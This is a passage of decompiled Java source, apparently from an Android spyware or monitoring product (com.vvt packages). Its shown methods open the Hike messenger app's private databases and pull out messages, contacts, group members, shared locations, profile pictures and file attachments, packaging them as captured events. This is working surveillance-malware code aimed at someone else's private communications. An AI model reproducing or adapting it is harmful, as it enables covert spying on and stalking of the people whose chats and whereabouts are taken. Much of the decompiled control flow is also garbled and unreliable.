          localObject5 = a(paramCursor);
          i5 = 3;
          localObject5 = a((String)localObject5, i5, paramBoolean, localDirection);
          localArrayList3.add(localObject5);
          m = c.a((com.vvt.im.events.info.a)localObject5);
          if (m == 0)
          {
            localObject2 = MessageType.Text;
            j = ((MessageType)localObject2).getNumber();
            localObject1 = HikeData.Direction.OUT;
            if (localDirection != localObject1) {
              break label1134;
            }
          }
          label1134:
          for (localObject1 = "[You sent an audio]";; localObject1 = "[You received an audio]")
          {
            localObject4 = localObject3;
            localObject3 = localObject1;
            localObject1 = localObject4;
            break;
          }
        }
        int i5 = 4;
        if (m == i5)
        {
          localObject2 = "message";
          j = paramCursor.getColumnIndex((String)localObject2);
          localObject3 = paramCursor.getString(j);
          localObject2 = MessageType.ShareLocation;
          j = ((MessageType)localObject2).getNumber();
          localObject1 = a(paramCursor);
          localObject1 = c((String)localObject1);
        }
        else
        {
          int i6 = 5;
          if (m == i6)
          {
            localObject2 = a(paramCursor);
            localObject1 = b((String)localObject2);
            localObject2 = MessageType.Contact;
            j = ((MessageType)localObject2).getNumber();
            localObject4 = localObject3;
            localObject3 = localObject1;
            localObject1 = localObject4;
          }
          else
          {
            int i7 = 6;
            if (m == i7)
            {
              localObject2 = "message";
              j = paramCursor.getColumnIndex((String)localObject2);
              localObject1 = paramCursor.getString(j);
              localObject2 = MessageType.none;
              j = ((MessageType)localObject2).getNumber();
              localObject5 = a(paramCursor);
              i8 = 6;
              localObject5 = a((String)localObject5, i8, paramBoolean, localDirection);
              localArrayList3.add(localObject5);
              m = c.a((com.vvt.im.events.info.a)localObject5);
              if (m == 0)
              {
                localObject2 = MessageType.Text;
                j = ((MessageType)localObject2).getNumber();
                localObject1 = HikeData.Direction.OUT;
                if (localDirection != localObject1) {
                  break label1390;
                }
              }
              label1390:
              for (localObject1 = "[You sent voice message]";; localObject1 = "[You received voice message]")
              {
                localObject4 = localObject3;
                localObject3 = localObject1;
                localObject1 = localObject4;
                break;
              }
            }
            int i8 = 7;
            if (m != i8) {
              break;
            }
            localObject2 = "message";
            j = paramCursor.getColumnIndex((String)localObject2);
            localObject1 = paramCursor.getString(j);
            localObject2 = MessageType.none;
            j = ((MessageType)localObject2).getNumber();
            localObject5 = a(paramCursor);
            int i9 = 7;
            localObject5 = a((String)localObject5, i9, paramBoolean, localDirection);
            localArrayList3.add(localObject5);
            m = c.a((com.vvt.im.events.info.a)localObject5);
            if (m != 0) {
              break;
            }
            localObject2 = MessageType.Text;
            j = ((MessageType)localObject2).getNumber();
            localObject1 = HikeData.Direction.OUT;
            if (localDirection == localObject1)
            {
              localObject4 = localObject3;
              localObject3 = "[You sent a file]";
              localObject1 = localObject4;
            }
            else
            {
              localObject4 = localObject3;
              localObject3 = "[You received a file]";
              localObject1 = localObject4;
            }
          }
        }
      }
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, String paramString3, long paramLong1, long paramLong2, com.vvt.base.b paramb, boolean paramBoolean)
  {
    boolean bool1 = b;
    if (bool1) {}
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = false;
    localObject1 = null;
    boolean bool2 = false;
    localSQLiteDatabase = null;
    localCursor = null;
    for (;;)
    {
      try
      {
        bool3 = com.vvt.ag.b.a(paramString2);
        if (!bool3) {
          localObject1 = com.vvt.capture.hike.a.a.a(paramString2);
        }
      }
      catch (Exception localException)
      {
        Object localObject2;
        boolean bool4;
        int i;
        Object localObject4;
        boolean bool5;
        String str;
        long l;
        bool3 = c;
        if ((!bool3) || (localCursor != null)) {
          localCursor.close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
        localObject1 = localArrayList;
        continue;
      }
      finally
      {
        boolean bool3 = false;
        localObject3 = null;
        localObject1 = localObject5;
        if (localCursor != null) {
          localCursor.close();
        }
        if (localObject3 != null) {
          ((SQLiteDatabase)localObject3).close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
      }
      try
      {
        bool3 = com.vvt.ag.b.a(paramString3);
        if (bool3) {
          continue;
        }
        localSQLiteDatabase = com.vvt.capture.hike.a.a.a(paramString3);
        if (localObject1 == null) {
          break label519;
        }
        localObject2 = b();
        bool4 = b;
        if (bool4) {}
        i = 2;
        localObject4 = new String[i];
        bool5 = false;
        str = String.valueOf(paramLong1);
        localObject4[0] = str;
        bool5 = true;
        str = String.valueOf(paramLong2);
        localObject4[bool5] = str;
        localCursor = ((SQLiteDatabase)localObject1).rawQuery((String)localObject2, (String[])localObject4);
        if (localCursor == null) {
          continue;
        }
        bool3 = b;
        if (bool3) {}
        localObject2 = paramString1;
        localObject4 = paramb;
        bool5 = paramBoolean;
        localArrayList = a((SQLiteDatabase)localObject1, localSQLiteDatabase, paramString1, localCursor, paramb, paramBoolean);
        localObject2 = localArrayList;
      }
      finally
      {
        localObject3 = localObject1;
        localObject1 = localObject6;
        continue;
        localObject3 = localArrayList;
        continue;
      }
      if (localCursor != null) {
        localCursor.close();
      }
      if (localObject1 != null) {
        ((SQLiteDatabase)localObject1).close();
      }
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
      localObject1 = localObject2;
      bool2 = b;
      if (bool2) {}
      return (ArrayList)localObject1;
      localObject2 = "com.bsb.hike";
      localObject4 = "chats";
      localObject1 = com.vvt.capture.hike.a.a.a((String)localObject2, (String)localObject4);
      continue;
      localObject2 = "com.bsb.hike";
      localObject4 = "hikeusers";
      localSQLiteDatabase = com.vvt.capture.hike.a.a.a((String)localObject2, (String)localObject4);
      continue;
      bool3 = b;
      if (bool3) {}
      l = 3000L;
      SystemClock.sleep(l);
      localObject2 = b();
      i = 2;
      localObject4 = new String[i];
      bool5 = false;
      str = String.valueOf(paramLong1);
      localObject4[0] = str;
      bool5 = true;
      str = String.valueOf(paramLong2);
      localObject4[bool5] = str;
      localCursor = ((SQLiteDatabase)localObject1).rawQuery((String)localObject2, (String[])localObject4);
      if (localCursor == null) {
        break label519;
      }
      bool3 = b;
      if (bool3) {}
      localObject2 = paramString1;
      localObject4 = paramb;
      bool5 = paramBoolean;
      localArrayList = a((SQLiteDatabase)localObject1, localSQLiteDatabase, paramString1, localCursor, paramb, paramBoolean);
      localObject2 = localArrayList;
    }
  }
  
  public static List a(HikeData paramHikeData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramHikeData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.HIKE.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramHikeData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramHikeData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramHikeData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramHikeData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramHikeData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramHikeData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramHikeData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramHikeData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramHikeData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramHikeData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramHikeData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.HIKE.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramHikeData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramHikeData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramHikeData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = b;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramHikeData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramHikeData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = b;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramHikeData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.HIKE.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramHikeData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramHikeData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramHikeData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramHikeData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d1 = paramHikeData.g().a();
      ((com.vvt.events.e)localObject1).a(d1);
      d1 = paramHikeData.g().b();
      ((com.vvt.events.e)localObject1).b(d1);
      localObject2 = paramHikeData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramHikeData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramHikeData.d();
    localObject5 = HikeData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramHikeData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.HIKE.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramHikeData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramHikeData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramHikeData.d();
      localObject2 = HikeData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramHikeData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static boolean a(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor)
  {
    boolean bool1 = false;
    boolean bool2 = b;
    if (bool2) {}
    int i = paramCursor.getColumnIndex("hikeFileType");
    String str1 = paramCursor.getString(i);
    boolean bool3 = com.vvt.ag.b.a(str1);
    if (bool3)
    {
      str1 = a(paramCursor);
      boolean bool4 = com.vvt.ag.b.a(str1);
      if (!bool4)
      {
        String str2 = "stId";
        bool3 = str1.contains(str2);
        if (bool3) {
          bool1 = true;
        }
      }
    }
    bool3 = b;
    if (bool3) {}
    return bool1;
  }
  
  private static HikeData.Direction b(Cursor paramCursor)
  {
    boolean bool1 = b;
    if (bool1) {}
    int i = paramCursor.getColumnIndex("msgStatus");
    Object localObject = paramCursor.getString(i);
    String str = "0";
    boolean bool3 = ((String)localObject).equals(str);
    if (!bool3)
    {
      str = "2";
      bool3 = ((String)localObject).equals(str);
      if (!bool3)
      {
        str = "3";
        bool3 = ((String)localObject).equals(str);
        if (!bool3)
        {
          str = "4";
          bool2 = ((String)localObject).equals(str);
          if (!bool2) {
            break label102;
          }
        }
      }
    }
    boolean bool2 = b;
    if (bool2) {}
    for (localObject = HikeData.Direction.OUT;; localObject = HikeData.Direction.IN)
    {
      return (HikeData.Direction)localObject;
      label102:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  private static com.vvt.im.events.info.e b(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.e locale = new com/vvt/im/events/info/e;
    locale.<init>();
    Object localObject = "u:";
    boolean bool2 = paramString1.startsWith((String)localObject);
    if (bool2) {
      paramString1 = b(paramSQLiteDatabase, paramString1);
    }
    localObject = ImMediaFileType.USER_PROFILE;
    localObject = a(paramString1, paramString2, (ImMediaFileType)localObject);
    String str = c(paramSQLiteDatabase, paramString1);
    locale.d(paramString1);
    locale.c(str);
    locale.a((String)localObject);
    bool2 = b;
    if (bool2) {}
    return locale;
  }
  
  private static f b(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor, String paramString1, String paramString2)
  {
    boolean bool1 = false;
    Object localObject = null;
    boolean bool2 = b;
    if (bool2) {}
    int i = paramCursor.getColumnIndex("msgHash");
    String str1 = paramCursor.getString(i);
    boolean bool4 = com.vvt.ag.b.a(str1);
    String str2;
    if (!bool4)
    {
      str2 = d(str1);
      bool1 = paramString2.equals(str2);
      if (bool1)
      {
        localObject = ImMediaFileType.OWNER_PROFILE;
        localObject = a(str2, paramString1, (ImMediaFileType)localObject);
        str1 = c(paramSQLiteDatabase, str2);
      }
    }
    for (;;)
    {
      f localf = new com/vvt/im/events/info/f;
      localf.<init>();
      localf.a(str2);
      localf.b(str1);
      localf.e((String)localObject);
      bool1 = b;
      if (bool1) {}
      return localf;
      localObject = ImMediaFileType.USER_PROFILE;
      localObject = a(str2, paramString1, (ImMediaFileType)localObject);
      break;
      boolean bool3 = b;
      if (bool3) {}
      bool3 = false;
      str1 = null;
      bool4 = false;
      str2 = null;
    }
  }
  
  private static String b()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("msgTable.message");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.msgStatus");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.timestamp");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.msgid");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.convid");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.metadata");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.groupParticipant");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.msisdn");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.msgHash");
    localStringBuilder.append(" , ");
    localStringBuilder.append("groupInfoTable.groupName");
    localStringBuilder.append(" , ");
    localStringBuilder.append("groupInfoTable.groupId");
    localStringBuilder.append(" , ");
    localStringBuilder.append("sharedMediaTable.hikeFileType");
    localStringBuilder.append(" FROM ");
    localStringBuilder.append("messages");
    localStringBuilder.append(" as msgTable");
    localStringBuilder.append(" LEFT JOIN ");
    localStringBuilder.append("groupInfo");
    localStringBuilder.append(" as groupInfoTable");
    localStringBuilder.append(" ON ");
    localStringBuilder.append("msgTable.msisdn");
    localStringBuilder.append(" = ");
    localStringBuilder.append("groupInfoTable.groupId");
    localStringBuilder.append(" LEFT JOIN ");
    localStringBuilder.append("sharedMediaTable");
    localStringBuilder.append(" ON ");
    localStringBuilder.append("msgTable.msgid");
    localStringBuilder.append(" = ");
    localStringBuilder.append("sharedMediaTable.msgid");
    localStringBuilder.append(" WHERE msgTable.timestamp > ?");
    localStringBuilder.append(" AND msgTable.timestamp <= ?");
    localStringBuilder.append(" AND msgTable.msgHash IS NOT NULL ");
    localStringBuilder.append(" ORDER BY msgTable.timestamp DESC");
    return localStringBuilder.toString();
  }
  
  private static String b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 1;
    boolean bool1 = false;
    Cursor localCursor = null;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    String str1 = "";
    int j;
    if (paramSQLiteDatabase != null)
    {
      j = 2;
      String[] arrayOfString1 = new String[j];
      arrayOfString1[0] = "uid";
      arrayOfString1[i] = "msisdn";
      String str2 = "uid =  ? ";
      String[] arrayOfString2 = new String[i];
      arrayOfString2[0] = paramString;
      localObject1 = paramSQLiteDatabase;
      localCursor = paramSQLiteDatabase.query("users", arrayOfString1, str2, arrayOfString2, null, null, null);
      if (localCursor == null) {}
    }
    for (;;)
    {
      boolean bool3;
      try
      {
        j = localCursor.getCount();
        if (j > 0)
        {
          localCursor.moveToFirst();
          localObject1 = "msisdn";
          j = localCursor.getColumnIndex((String)localObject1);
          localObject1 = localCursor.getString(j);
        }
      }
      catch (Exception localException2)
      {
        str3 = str1;
        boolean bool4 = c;
        if (!bool4) {
          continue;
        }
        continue;
      }
      finally
      {
        localCursor.close();
      }
      try
      {
        bool4 = com.vvt.ag.b.a((String)localObject1);
        if (!bool4) {
          break label260;
        }
        bool3 = b;
        if (!bool3) {}
      }
      catch (Exception localException1)
      {
        String str4;
        continue;
        paramString = str4;
      }
    }
    Object localObject1 = paramString;
    localCursor.close();
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return (String)localObject1;
      bool3 = b;
      if (bool3) {}
      localObject1 = paramString;
      break;
      String str3;
      bool3 = b;
      if (bool3) {}
      str4 = str1;
    }
  }
  
  private static String b(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    localObject1 = "";
    localObject2 = "";
    Object localObject3 = "";
    try
    {
      localObject4 = new org/json/JSONObject;
      ((JSONObject)localObject4).<init>(paramString);
      String str = "files";
      localObject4 = ((JSONObject)localObject4).getJSONArray(str);
      boolean bool2 = false;
      str = null;
      localObject4 = ((JSONArray)localObject4).getJSONObject(0);
      str = "name";
      localObject2 = ((JSONObject)localObject4).getString(str);
      str = "phone_numbers";
      bool2 = ((JSONObject)localObject4).has(str);
      if (bool2)
      {
        str = "phone_numbers";
        localObject4 = ((JSONObject)localObject4).getJSONArray(str);
        bool2 = false;
        str = null;
        localObject4 = ((JSONArray)localObject4).getJSONObject(0);
        str = "Mobile";
        localObject3 = ((JSONObject)localObject4).getString(str);
      }
    }
    catch (JSONException localJSONException)
    {
      for (;;)
      {
        Object localObject4;
        boolean bool4;
        boolean bool3 = b;
        if (bool3)
        {
          continue;
          localObject2 = localObject1;
        }
      }
    }
    bool3 = com.vvt.ag.b.a((String)localObject2);
    if (!bool3)
    {
      localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
      localObject4 = "Name: ";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject4);
      localObject2 = (String)localObject2;
      bool4 = com.vvt.ag.b.a((String)localObject3);
      if (!bool4)
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject2 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject1 = " (";
        localObject3 = ((StringBuilder)localObject2).append((String)localObject1).append((String)localObject3).append(")");
        localObject2 = ((StringBuilder)localObject3).toString();
      }
      bool1 = b;
      if (bool1) {}
      return (String)localObject2;
    }
  }
  
  private static String b(String paramString1, String paramString2, ImMediaFileType paramImMediaFileType)
  {
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    String str = "";
    SQLiteDatabase localSQLiteDatabase = com.vvt.capture.hike.a.a.a(c.b());
    Object localObject1 = "thumbnails";
    int i = 2;
    Object localObject2 = new String[i];
    localObject2[0] = "msisdn";
    localObject2[bool1] = "image";
    Object localObject3 = "msisdn = ?";
    Object localObject4 = new String[bool1];
    localObject4[0] = paramString1;
    localObject2 = localSQLiteDatabase.query((String)localObject1, (String[])localObject2, (String)localObject3, (String[])localObject4, null, null, null);
    boolean bool3;
    int k;
    if (localObject2 != null)
    {
      bool3 = bool1;
      k = ((Cursor)localObject2).getCount();
      if (k <= 0) {
        break label240;
      }
    }
    for (;;)
    {
      bool3 &= bool1;
      if (!bool3) {
        break label262;
      }
      bool3 = b;
      if (bool3) {}
      ((Cursor)localObject2).moveToFirst();
      int j = ((Cursor)localObject2).getColumnIndex("image");
      localObject1 = ((Cursor)localObject2).getBlob(j);
      if (localObject1 == null) {
        break label245;
      }
      k = localObject1.length;
      if (k == 0) {
        break label245;
      }
      localObject3 = ImType.HIKE;
      localObject3 = com.vvt.im.a.c.a(paramString2, (ImType)localObject3, paramImMediaFileType);
      localObject4 = com.vvt.im.a.c.a(paramImMediaFileType);
      localObject1 = com.vvt.io.d.a((byte[])localObject1, (String)localObject3, (String)localObject4);
      ((Cursor)localObject2).close();
      localSQLiteDatabase.close();
      bool2 = b;
      if (bool2) {}
      return (String)localObject1;
      j = 0;
      localObject1 = null;
      break;
      label240:
      bool1 = false;
    }
    label245:
    boolean bool4 = b;
    if (bool4) {}
    for (;;)
    {
      localObject1 = str;
      break;
      label262:
      bool4 = b;
      if (!bool4) {}
    }
  }
  
  private static ArrayList b(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString, Cursor paramCursor)
  {
    int i = 1;
    boolean bool1 = b;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = c(paramCursor);
    int m = paramCursor.getColumnIndex("msisdn");
    Object localObject1 = paramCursor.getString(m);
    Object localObject2;
    if (!bool1)
    {
      localObject2 = b(paramSQLiteDatabase2, (String)localObject1, paramString);
      if (localObject2 != null) {
        localArrayList.add(localObject2);
      }
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = b;
      if (bool1) {}
      return localArrayList;
      String[] arrayOfString1 = new String[3];
      arrayOfString1[0] = "groupId";
      arrayOfString1[i] = "msisdn";
      int j = 2;
      arrayOfString1[j] = "name";
      String str = "groupId =  ? ";
      String[] arrayOfString2 = new String[i];
      arrayOfString2[0] = localObject1;
      localObject2 = paramSQLiteDatabase1;
      localObject1 = paramSQLiteDatabase1.query("groupMembers", arrayOfString1, str, arrayOfString2, null, null, null);
      try
      {
        for (;;)
        {
          boolean bool2 = ((Cursor)localObject1).moveToNext();
          if (!bool2) {
            break;
          }
          localObject2 = "msisdn";
          int k = ((Cursor)localObject1).getColumnIndex((String)localObject2);
          localObject2 = ((Cursor)localObject1).getString(k);
          boolean bool4 = com.vvt.ag.b.a((String)localObject2);
          if (!bool4)
          {
            localObject2 = b(paramSQLiteDatabase2, (String)localObject2, paramString);
            if (localObject2 != null) {
              localArrayList.add(localObject2);
            }
          }
        }
      }
      catch (Exception localException)
      {
        boolean bool3 = c;
        if (bool3) {}
        ((Cursor)localObject1).close();
      }
      finally
      {
        ((Cursor)localObject1).close();
      }
    }
  }
  
  private static com.vvt.im.events.info.c c(String paramString)
  {
    double d1 = 0.0D;
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = "";
    for (;;)
    {
      try
      {
        Object localObject2 = new org/json/JSONObject;
        ((JSONObject)localObject2).<init>(paramString);
        String str1 = "files";
        localObject2 = ((JSONObject)localObject2).getJSONArray(str1);
        str1 = null;
        Object localObject3 = ((JSONArray)localObject2).getJSONObject(0);
        localObject2 = "lat";
        double d2 = ((JSONObject)localObject3).getDouble((String)localObject2);
        String str2 = "long";
        boolean bool3;
        bool2 = b;
      }
      catch (JSONException localJSONException1)
      {
        try
        {
          d1 = ((JSONObject)localObject3).getDouble(str2);
          bool2 = com.vvt.ag.b.a((String)localObject1);
          if (bool2)
          {
            localObject1 = new java/lang/StringBuilder;
            ((StringBuilder)localObject1).<init>();
            localObject1 = ((StringBuilder)localObject1).append("lat: ").append(d2);
            localObject3 = " lng: ";
            localObject1 = (String)localObject3 + d1;
          }
          localObject3 = new com/vvt/im/events/info/c;
          ((com.vvt.im.events.info.c)localObject3).<init>();
          ((com.vvt.im.events.info.c)localObject3).a((String)localObject1);
          ((com.vvt.im.events.info.c)localObject3).a(d2);
          ((com.vvt.im.events.info.c)localObject3).b(d1);
          bool3 = b;
          if (bool3) {}
          return (com.vvt.im.events.info.c)localObject3;
        }
        catch (JSONException localJSONException2)
        {
          boolean bool2;
          for (;;) {}
        }
        localJSONException1 = localJSONException1;
        d2 = d1;
      }
      if (!bool2) {}
    }
  }
  
  private static String c()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "timestamp";
    arrayOfObject[1] = "messages";
    arrayOfObject[2] = "timestamp";
    return String.format("SELECT %s FROM %s  ORDER BY %s DESC LIMIT 1", arrayOfObject);
  }
  
  private static String c(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 2;
    int j = 1;
    boolean bool1 = false;
    Cursor localCursor = null;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    String str1 = "";
    if (paramSQLiteDatabase != null)
    {
      String[] arrayOfString1 = new String[i];
      arrayOfString1[0] = "name";
      arrayOfString1[j] = "msisdn";
      String str2 = "msisdn =  ?  OR uid =  ? ";
      String[] arrayOfString2 = new String[i];
      arrayOfString2[0] = paramString;
      arrayOfString2[j] = paramString;
      localObject1 = paramSQLiteDatabase;
      j = 0;
      localCursor = paramSQLiteDatabase.query("users", arrayOfString1, str2, arrayOfString2, null, null, null);
      if (localCursor == null) {}
    }
    for (;;)
    {
      boolean bool3;
      try
      {
        int k = localCursor.getCount();
        if (k > 0)
        {
          localCursor.moveToFirst();
          localObject1 = "name";
          k = localCursor.getColumnIndex((String)localObject1);
          localObject1 = localCursor.getString(k);
        }
      }
      catch (Exception localException2)
      {
        str3 = str1;
        boolean bool4 = c;
        if (!bool4) {
          continue;
        }
        continue;
      }
      finally
      {
        localCursor.close();
      }
      try
      {
        bool4 = com.vvt.ag.b.a((String)localObject1);
        if (!bool4) {
          break label269;
        }
        bool3 = b;
        if (!bool3) {}
      }
      catch (Exception localException1)
      {
        String str4;
        continue;
        paramString = str4;
      }
    }
    Object localObject1 = paramString;
    localCursor.close();
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return (String)localObject1;
      bool3 = b;
      if (bool3) {}
      localObject1 = paramString;
      break;
      String str3;
      bool3 = b;
      if (bool3) {}
      str4 = str1;
    }
  }
  
  private static boolean c(Cursor paramCursor)
  {
    boolean bool1 = b;
    if (bool1) {}
